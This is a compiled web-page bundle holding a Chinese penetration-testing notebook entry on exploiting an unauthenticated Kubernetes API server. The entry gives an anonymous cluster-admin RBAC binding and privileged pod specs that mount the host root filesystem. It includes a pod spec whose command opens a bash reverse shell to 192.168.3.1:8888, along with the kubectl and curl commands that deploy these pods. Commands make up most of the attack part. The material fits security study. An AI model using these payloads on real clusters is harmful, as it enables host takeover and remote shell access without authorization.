"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[8030],{3492:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>c,default:()=>h,frontMatter:()=>i,metadata:()=>r,toc:()=>d});const r=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/kubernetes/k8s\u4e0b\u7684\u5404\u79cd\u672a\u6388\u6743/ApiServer","title":"Apiserver","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/04.\u5185\u7f51\u6e17\u900f/02.kubernetes/03.k8s\u4e0b\u7684\u5404\u79cd\u672a\u6388\u6743/01.ApiServer.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/04.\u5185\u7f51\u6e17\u900f/02.kubernetes/03.k8s\u4e0b\u7684\u5404\u79cd\u672a\u6388\u6743","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/kubernetes/k8s\u4e0b\u7684\u5404\u79cd\u672a\u6388\u6743/ApiServer","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/kubernetes/k8s\u4e0b\u7684\u5404\u79cd\u672a\u6388\u6743/ApiServer","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/04.\u5185\u7f51\u6e17\u900f/02.kubernetes/03.k8s\u4e0b\u7684\u5404\u79cd\u672a\u6388\u6743/01.ApiServer.md","tags":[],"version":"current","sidebarPosition":1,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"k8s\u4e0b\u7684\u5404\u79cd\u672a\u6388\u6743","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/kubernetes/k8s\u4e0b\u7684\u5404\u79cd\u672a\u6388\u6743/"},"next":{"title":"etcd","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/kubernetes/k8s\u4e0b\u7684\u5404\u79cd\u672a\u6388\u6743/Etcd"}}');var t=s(4848),l=s(8453);const i={},c="Apiserver",a={},d=[{value:"kubectl\u5229\u7528",id:"kubectl\u5229\u7528",level:2},{value:"Api \u5229\u7528",id:"api-\u5229\u7528",level:2},{value:"\u7ed3\u8bba",id:"\u7ed3\u8bba",level:2}];function o(e){const n={a:"a",blockquote:"blockquote",code:"code",del:"del",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,l.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"apiserver",children:"Apiserver"})}),"\n",(0,t.jsxs)(n.table,{children:[(0,t.jsx)(n.thead,{children:(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,t.jsx)(n.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,t.jsx)(n.tbody,{children:(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"left"},children:(0,t.jsx)(n.img,{src:"https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green",alt:"wjlin0"})}),(0,t.jsx)(n.td,{style:{textAlign:"left"},children:"2025-10-15 00:33:30"})]})})]}),"\n",(0,t.jsxs)(n.p,{children:["API \u670d\u52a1\u5668\u662f Kubernetes ",(0,t.jsx)(n.a,{href:"https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane",children:"\u63a7\u5236\u5e73\u9762"}),"\u7684\u7ec4\u4ef6\uff0c \u8be5\u7ec4\u4ef6\u8d1f\u8d23\u516c\u5f00\u4e86 Kubernetes API\uff0c\u8d1f\u8d23\u5904\u7406\u63a5\u53d7\u8bf7\u6c42\u7684\u5de5\u4f5c\u3002 API \u670d\u52a1\u5668\u662f Kubernetes \u63a7\u5236\u5e73\u9762\u7684\u524d\u7aef\u3002Kubernetes API \u670d\u52a1\u5668\u7684\u4e3b\u8981\u5b9e\u73b0\u662f ",(0,t.jsx)(n.a,{href:"https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-apiserver/",children:"kube-apiserver"}),"\u3002 ",(0,t.jsx)(n.code,{children:"kube-apiserver"})," \u8bbe\u8ba1\u4e0a\u8003\u8651\u4e86\u6c34\u5e73\u6269\u7f29\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u53ef\u901a\u8fc7\u90e8\u7f72\u591a\u4e2a\u5b9e\u4f8b\u6765\u8fdb\u884c\u6269\u7f29\u3002 \u4f60\u53ef\u4ee5\u8fd0\u884c ",(0,t.jsx)(n.code,{children:"kube-apiserver"})," \u7684\u591a\u4e2a\u5b9e\u4f8b\uff0c\u5e76\u5728\u8fd9\u4e9b\u5b9e\u4f8b\u4e4b\u95f4\u5e73\u8861\u6d41\u91cf\u3002"]}),"\n",(0,t.jsxs)(n.p,{children:["\u4ee5\u4e0a\u662fk8s\u5b98\u65b9\u5bf9",(0,t.jsx)(n.code,{children:"apiserver"}),"\u7684\u89e3\u91ca\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 ",(0,t.jsx)(n.code,{children:"apiserver"})," \u5176\u5b9e\u5c31\u662f\u4e3a\u4e86\u7edf\u4e00\u65b9\u4fbf\u7ba1\u7406\u3002 \u90e8\u7f72\u8fc7k8s\u90fd\u77e5\u9053\u8c03\u7528",(0,t.jsx)(n.code,{children:"apiserver"}),"\u7684\u547d\u4ee4\u884c\u5de5\u5177\u5c31\u662f",(0,t.jsx)(n.code,{children:"kubectl"}),"\uff0c\u4f8b\u5982\u5728\u4e3b\u673a\u6267\u884c ",(0,t.jsx)(n.code,{children:"kubectl get pods -A"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202307072231736.png",alt:"image-20230707223132174"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5176\u5b9e\u5c31\u662f\u53ef\u4ee5\u7406\u89e3\u4e3a \u8c03\u7528 api ",(0,t.jsx)(n.code,{children:"/api/v1/pods/"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202307072232250.png",alt:"image-20230707223255087"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5728 ",(0,t.jsx)(n.code,{children:"kube-apiserver"})," \u7684 ",(0,t.jsx)(n.a,{href:"",children:"\u542f\u52a8\u53c2\u6570"}),(0,t.jsx)(n.del,{children:"\u76ee\u524d\u5b98\u65b9\u6587\u6863\u4e2d\u6ca1\u6709\u5bf9\u8fd9\u4e2a\u53c2\u6570\u7684\u89e3\u91ca\u4e86"}),"\u4e2d \u5b58\u5728\u4e24\u4e2a\u53c2\u6570   ",(0,t.jsx)(n.code,{children:"insecure"}),"\u3001",(0,t.jsx)(n.code,{children:"insecure-bind-address"})," \u8be5\u53c2\u6570\u53ef\u5c06\u672a\u6388\u6743\u7684\u7aef\u53e3\u66b4\u9732\u51fa\u6765"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"kube-apiserver --h\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202307072341464.png",alt:"image-20230707234104496"})}),"\n",(0,t.jsx)(n.p,{children:"\u6216\u8005\u7ba1\u7406\u5458\u914d\u7f6e\u4e86\u533f\u540d\u8bbf\u95ee\uff0c\u4f8b\u5982"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"[root@k8s-master01 k8s.yaml]# cat rbac.yaml \napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: anonymous-access\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n- kind: Group\n  name: system:unauthenticated\n[root@k8s-master01 k8s.yaml]# kubectl apply -f rbac.yaml\n"})}),"\n",(0,t.jsx)(n.h2,{id:"kubectl\u5229\u7528",children:"kubectl\u5229\u7528"}),"\n",(0,t.jsx)(n.p,{children:"\u5b89\u88c5 kubectl"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'curl -LO https://dl.k8s.io/release/v1.18.5/bin/linux/amd64/kubectl # \u5b89\u88c5\u6307\u5b9a\u7248\u672c\ncurl.exe -LO "https://dl.k8s.io/release/v1.18.5/bin/windows/amd64/kubectl.exe" # windows\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u5236\u4f5c\u6076\u610f\u5bb9\u5668``shell.yaml`"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'# shell.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: shell-pod\n  # namespace: nginx # \u4e0d\u6307\u5b9a\u5219\u4e3a\u9ed8\u8ba4\u7a7a\u95f4 default\nspec:\n  containers:\n    - name: my-container # \u5bb9\u5668\u540d\u79f0 \n      image: nginx # \u955c\u50cf\n      command: ["tail", "-f", "/dev/null"] # \u4e0d\u5173\u95ed\u8fdb\u7a0b\n      securityContext:\n        privileged: true # \u7279\u6743\u6a21\u5f0f\n      volumeMounts: # \u6302\u8f7d\u6570\u636e\u5377 / -> /hosts\n        - name: root-volume \n          mountPath: /hosts\n  volumes:\n    - name: root-volume\n      hostPath:\n        path: /\n  nodeName: k8s-master01 # \u9009\u62e9\u5bbf\u4e3b\u673a \u53ef\u4ee5\u4e0d\u9009\u62e9 \u4fdd\u6301\u9ed8\u8ba4\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u542f\u52a8\u3001\u5e76\u67e5\u770b"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"kubectl -s http://192.168.3.200:8080 apply -f shell.yaml\nkubectl -s http://192.168.3.200:8080 get po -A\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202307072316500.png",alt:"image-20230707230304985"})}),"\n",(0,t.jsx)(n.p,{children:"\u8fdb\u5165\u5bb9\u5668"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"kubectl -s http://192.168.3.200:8080 exec -it <\u5bb9\u5668\u540d\u79f0> -n <\u547d\u540d\u7a7a\u95f4> -- bash \nroot@shell-pod:/# whoami\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202307072316581.png",alt:"image-20230707230045674"})}),"\n",(0,t.jsx)(n.h2,{id:"api-\u5229\u7528",children:"Api \u5229\u7528"}),"\n",(0,t.jsxs)(n.p,{children:["\u5236\u4f5c\u6076\u610f",(0,t.jsx)(n.a,{href:"re-shell.json",children:"\u5bb9\u5668\u6587\u4ef6"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-yaml",children:'{\n  "apiVersion": "v1",\n  "kind": "Pod",\n  "metadata": {\n    "name": "re-shell-pod"\n  },\n  "spec": {\n    "containers": [\n      {\n        "name": "re-shell-pod",\n        "image": "nginx",\n        "command": ["/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/192.168.3.1/8888 0>&1"],\n        "securityContext": {\n          "privileged": true\n        },\n        "volumeMounts": [\n          {\n            "name": "root-volume",\n            "mountPath": "/hosts"\n          }\n        ]\n      }\n    ],\n    "volumes": [\n      {\n        "name": "root-volume",\n        "hostPath": {\n          "path": "/"\n        }\n      }\n    ],\n    "nodeName": "k8s-master01"\n  }\n}\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u65b0\u5efa\u6076\u610f\u5bb9\u5668"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'curl -X POST -H "Content-Type: application/json" --data-binary "@re-shell.json" http://192.168.3.200:8080/api/v1/namespaces/<\u547d\u540d\u7a7a\u95f4>/pods\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202307072316006.png",alt:"image-20230707231610327"})}),"\n",(0,t.jsx)(n.p,{children:"\u67e5\u770b\u72b6\u6001"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"curl http://192.168.3.200:8080/api/v1/namespaces/default/pods/re-shell-pod/status\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202307072345177.png",alt:"image-20230707232122633"})}),"\n",(0,t.jsx)(n.p,{children:"\u76d1\u542c\u53cd\u5f39shell\u7aef\u53e3"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202307072323246.png",alt:"image-20230707232204596"})}),"\n",(0,t.jsx)(n.h2,{id:"\u7ed3\u8bba",children:"\u7ed3\u8bba"}),"\n",(0,t.jsx)(n.p,{children:"\u200b\t\u5bf9\u4e8e\u8fd9\u7c7b\u5229\u7528\u4ec5\u4ec5\u5728\u4e8e apiserver \u672a\u914d\u7f6e\u8ba4\u8bc1\u7684\u6e05\u7a7a\u4e0b\uff0c\u800c\u76ee\u524d\u7684\u73af\u5883\u4e0d\u592a\u53ef\u80fd\u5c06\u4e0d\u5b89\u5168\u7684\u7aef\u53e3\u7206\u7834\u51fa\u6765\uff0c\u800c\u4e14\u6700\u65b0\u7248\u672c\u4e5f\u5bf9\u8fd9\u4e24\u4e2a\u53c2\u6570\u4e5f\u6ca1\u6709\u518d\u89e3\u91ca\u5f88\u96be\u53bb\u5229\u7528\u672a\u6388\u6743"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsxs)(n.p,{children:["\u66f4\u591a\u5229\u7528\u65b9\u5f0f\u770b\u5b98\u65b9\u6587\u6863\u5373\u53ef  ",(0,t.jsx)(n.a,{href:"https://kubernetes.io/zh-cn/docs/reference/kubernetes-api/",children:"Kubernetes API"})]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"\u200b"})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(o,{...e})}):o(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>c});var r=s(6540);const t={},l=r.createContext(t);function i(e){const n=r.useContext(l);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),r.createElement(l.Provider,{value:n},e.children)}}}]);